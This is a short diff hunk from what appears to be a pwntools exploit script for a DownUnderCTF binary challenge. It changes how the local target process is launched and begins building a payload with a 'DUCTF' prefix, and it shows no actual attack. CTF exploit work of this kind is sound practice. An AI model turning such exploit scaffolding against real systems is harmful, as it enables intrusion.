@@ -244,7 +244,7 @@ Full script to launch binary (or connect to CTF server if REMOTE param provided)
         remote_port = 30013
         io = remote(remote_server, remote_port)
     else:
-        io = start(arguments)
+        io = process([elfexe.path] + arguments)
     
     paylod = flat(  # build payload
         b'DUCTF\x00',
